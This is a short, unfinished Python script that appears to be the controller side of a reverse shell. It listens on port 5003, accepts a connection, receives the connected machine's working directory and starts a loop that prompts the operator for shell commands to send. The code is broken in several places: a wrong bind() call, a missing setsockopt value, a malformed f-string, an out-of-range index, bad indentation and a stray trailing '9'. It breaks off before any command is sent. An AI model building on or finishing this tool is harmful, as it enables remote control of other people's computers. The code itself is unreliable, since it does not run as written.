import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 124 
SEPARATOR = "<sep>"

s = socket.socket()
#binding the port created
s.bind(SERVER_HOST, SERVER_PORT)
#LISTENING FORCONNECTION
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)
s.listen(5)
print(f"listening to {SERVER_HOST} : {SERVER_PORT}")

#accept any connection attempted
client_socket, client_address = s.accept()
print("f{client_address[0]}, {client_address[2]} connected ")

#recieve the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] current working directory :", cwd)
#main loop to send shell commands

while True:
    #get command from the promp
    command = input(f"{cwd} $>")
    if not command.strip():
    # send empty commands
    continue
#send packets of command when connected
9
